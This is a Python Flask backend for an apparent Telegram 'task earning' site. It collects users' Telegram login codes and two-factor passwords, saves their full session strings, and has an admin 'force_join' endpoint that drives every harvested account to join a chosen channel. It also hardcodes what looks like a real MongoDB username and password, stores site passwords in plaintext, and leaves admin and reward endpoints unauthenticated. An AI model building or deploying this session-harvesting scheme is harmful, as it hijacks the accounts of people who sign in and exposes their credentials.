import os
import base64
import asyncio
import requests
import datetime
from flask import Flask, request, jsonify, render_template
from flask_cors import CORS
from telethon import TelegramClient, functions
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
from pymongo import MongoClient
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

app = Flask(__name__)
CORS(app)

# --- ১. কনফিগারেশন (আপনার দেওয়া তথ্য অনুযায়ী) ---
API_ID = 36466824      
API_HASH = '535ddcb85f2c3c74cc0ff532dd2c3406'  
SECRET_KEY = b'AAF_STRONG_APP_SECURE_32_BIT_KEY' # এনক্রিপশন কি

# MongoDB কানেকশন
MONGO_URI = os.environ.get("MONGO_URI", "mongodb+srv://abdullahasfakfarvezbd_db_user:Abdullah6790@cluster0.rmulyqq.mongodb.net/?appName=Cluster0")
client_db = MongoClient(MONGO_URI)
db = client_db['AAF_TeleEarn'] # আপনার ডাটাবেস নাম
users_col = db['users']
sessions_col = db['sessions']
tasks_col = db['tasks']

# ওটিপি প্রসেস করার জন্য সাময়িক মেমোরি
temp_clients = {}

# --- ২. সেশন এনক্রিপশন লজিক (Security) ---
def encrypt_session(session_str):
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(session_str.encode(), AES.block_size))
    iv = base64.b64encode(cipher.iv).decode('utf-8')
    ct = base64.b64encode(ct_bytes).decode('utf-8')
    return f"{iv}:{ct}"

def decrypt_session(encrypted_str):
    try:
        iv_b64, ct_b64 = encrypted_str.split(':')
        iv = base64.b64decode(iv_b64)
        ct = base64.b64decode(ct_b64)
        cipher = AES.new(SECRET_KEY, AES.MODE_CBC, iv)
        return unpad(cipher.decrypt(ct), AES.block_size).decode('utf-8')
    except:
        return encrypted_str

# --- ৩. ইউজার লগইন ও টেলিগ্রাম সেশন জেনারেশন ---

@app.route('/api/send_otp', methods=['POST'])
async def send_otp():
    data = request.json
    phone = data.get('phone')
    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        sent_code = await client.send_code_request(phone)
        temp_clients[phone] = {
            'client': client,
            'phone_code_hash': sent_code.phone_code_hash
        }
        return jsonify({"success": True, "message": "OTP Sent!"})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

@app.route('/api/verify_login', methods=['POST'])
async def verify_login():
    data = request.json
    phone = data.get('phone')
    code = data.get('code')
    password = data.get('password') # 2FA Password
    full_name = data.get('name')
    site_pass = data.get('site_password')

    if phone not in temp_clients:
        return jsonify({"success": False, "message": "Session Expired. Please retry."})

    client_data = temp_clients[phone]
    client = client_data['client']
    
    try:
        try:
            await client.sign_in(phone, code, phone_code_hash=client_data['phone_code_hash'])
        except SessionPasswordNeededError:
            await client.sign_in(password=password)

        raw_session = client.session.save()
        me = await client.get_me()
        
        # সেশন এনক্রিপ্ট করে সুরক্ষিত করা
        encrypted_session = encrypt_session(raw_session)

        # ১. ইউজার ডাটা মঙ্গো-বিডিতে সেভ
        user_doc = {
            "telegram_id": me.id,
            "name": full_name,
            "phone": phone,
            "site_password": site_pass,
            "username": me.username,
            "status": "Active",
            "task_balance": 0.0,
            "added_accounts": 1,
            "created_at": datetime.datetime.now()
        }
        users_col.update_one({"telegram_id": me.id}, {"$set": user_doc}, upsert=True)
        
        # ২. সেশন ডাটা আলাদা কালেকশনে সেভ
        sessions_col.update_one(
            {"phone": phone},
            {"$set": {"telegram_id": me.id, "session": encrypted_session, "status": "Active"}},
            upsert=True
        )
        
        await client.disconnect()
        del temp_clients[phone]
        return jsonify({"success": True, "message": "Login Success!"})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

# --- ৪. টাস্ক কন্ট্রোল ও রিওয়ার্ড লজিক ---

@app.route('/admin/add_task', methods=['POST'])
def admin_add_task():
    data = request.json
    new_task = {
        "task_id": datetime.datetime.now().strftime("%Y%m%d%H%M%S"),
        "title": data.get('title'),
        "link": data.get('link'),
        "reward_amount": float(data.get('reward', 0.08)), # অ্যাডমিন যা দিবে তাই হবে
        "status": "active"
    }
    tasks_col.insert_one(new_task)
    return jsonify({"status": "success", "message": "New Task Added!"})

@app.route('/api/complete_task', methods=['POST'])
def complete_task():
    data = request.json
    uid = data.get('user_id')
    tid = data.get('task_id')
    
    task = tasks_col.find_one({"task_id": tid})
    if task:
        reward = task['reward_amount']
        users_col.update_one({"telegram_id": int(uid)}, {"$inc": {"task_balance": reward}})
        return jsonify({"status": "success", "added": reward})
    return jsonify({"status": "error", "message": "Task Not Found"})

@app.route('/api/claim_daily_bonus', methods=['POST'])
def claim_daily():
    uid = request.json['user_id']
    user = users_col.find_one({"telegram_id": int(uid)})
    now = datetime.datetime.now()
    last = user.get('last_bonus_time')
    
    if last and now < last + datetime.timedelta(hours=24):
        return jsonify({"status": "error", "message": "Wait 24h!"})
        
    users_col.update_one(
        {"telegram_id": int(uid)}, 
        {"$inc": {"task_balance": 1.0}, "$set": {"last_bonus_time": now}}
    )
    return jsonify({"status": "success", "bonus": 1.0})

# --- ৫. অ্যাডমিন মাস্টার কন্ট্রোল (Force Join) ---

async def perform_join(channel_to_join):
    all_sessions = sessions_col.find({"status": "Active"})
    count = 0
    for sess in all_sessions:
        try:
            string_session = decrypt_session(sess['session'])
            async with TelegramClient(StringSession(string_session), API_ID, API_HASH) as client:
                await client(functions.channels.JoinChannelRequest(channel=channel_to_join))
                count += 1
        except: continue
    return count

@app.route('/api/admin/force_join', methods=['POST'])
def force_join_trigger():
    data = request.json
    channel = data.get('channel', '@aaf_tele_earn')
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    count = loop.run_until_complete(perform_join(channel))
    return jsonify({"status": "success", "joined": count})

# --- ৬. রাউটিং ও ড্যাশবোর্ড ---

@app.route('/')
def dashboard(): return render_template('index.html')

@app.route('/tasks')
def task_page(): return render_template('task.html')

@app.route('/aaf-admin-master')
def admin_panel(): return render_template('admin.html')

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
